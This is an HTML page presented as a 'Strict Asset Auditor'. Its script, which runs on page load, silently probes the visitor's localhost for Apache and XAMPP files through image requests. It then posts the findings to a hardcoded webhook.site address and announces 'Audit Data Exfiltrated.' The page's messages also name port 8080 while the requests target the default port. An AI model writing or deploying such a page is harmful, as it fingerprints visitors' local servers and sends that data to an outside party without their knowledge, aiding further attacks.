<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <title>Strict 200 OK Auditor</title>
    <style>
        :root { --glow: #00ff41; --bg: #050505; }
        body { background: var(--bg); color: var(--glow); font-family: 'Consolas', monospace; padding: 40px; }
        .terminal { background: #000; border: 1px solid var(--glow); height: 500px; overflow-y: auto; padding: 20px; box-shadow: 0 0 20px rgba(0,255,65,0.2); border-radius: 10px; }
        .found { color: #000; background: var(--glow); font-weight: bold; padding: 5px; margin: 5px 0; border-radius: 3px; }
        .header { text-align: center; border-bottom: 1px solid var(--glow); padding-bottom: 10px; margin-bottom: 20px; }
    </style>
</head>
<body>

    <div class="header">
        <h1>Firefox Strict Asset Auditor</h1>
        <p style="color: #888;">Only reporting 100% Verified (200 OK) Assets</p>
    </div>

    <div id="log" class="terminal">> Waiting for page load...</div>

<script>
    const WEBHOOK = "https://webhook.site/5c8dfb93-43de-4bdc-8216-4895cb4b323d";
    const logBox = document.getElementById('log');

    function print(msg, isFound = false) {
        const div = document.createElement('div');
        if (isFound) div.className = 'found';
        div.innerHTML = `> [${new Date().toLocaleTimeString()}] ${msg}`;
        logBox.appendChild(div);
        logBox.scrollTop = logBox.scrollHeight;
    }

    // Yeh function sirf 200 OK par hi true return karega
    async function verifyAssetStrict(path) {
        return new Promise((resolve) => {
            const img = new Image();
            
            // Onload ka matlab hai server ne 200 OK bhej diya aur image load ho gayi
            img.onload = () => resolve(true);
            
            // Onerror ka matlab hai 404, 403, ya Connection Refused
            img.onerror = () => resolve(false);
            
            img.src = `http://127.0.0.1/${path}?verify=${Date.now()}`;
            
            // 2 second ka timeout agar port block ho toh
            setTimeout(() => resolve(false), 2000);
        });
    }

    window.onload = async function() {
        print("Starting Strict 200 OK Scan on Port 8080...");

        const targets = [
            { name: "Apache Welcome Sign", path: "/icons/apache_pb.png" },
            { name: "XAMPP Dashboard Logo", path: "/dashboard/images/xampp-logo.svg" },
            { name: "Favicon Asset", path: "/favicon.ico" }
        ];

        let discovered = [];

        for (let t of targets) {
            print(`Testing path: ${t.path} ...`);
            const isFound = await verifyAssetStrict(t.path);
            
            if (isFound) {
                print(`VERIFIED FOUND (200 OK): ${t.name}`, true);
                discovered.push(t);
            }
        }

        if (discovered.length > 0) {
            print("Sending verified results to Webhook...");
            fetch(WEBHOOK, { 
                method: 'POST', 
                mode: 'no-cors', 
                body: JSON.stringify({ status: "Verified_200_OK", assets: discovered }) 
            });
            print("Audit Data Exfiltrated.", true);
        } else {
            print("No 100% verified assets found on 127.0.0.1:8080.");
        }
    };
</script>
</body>
</html>
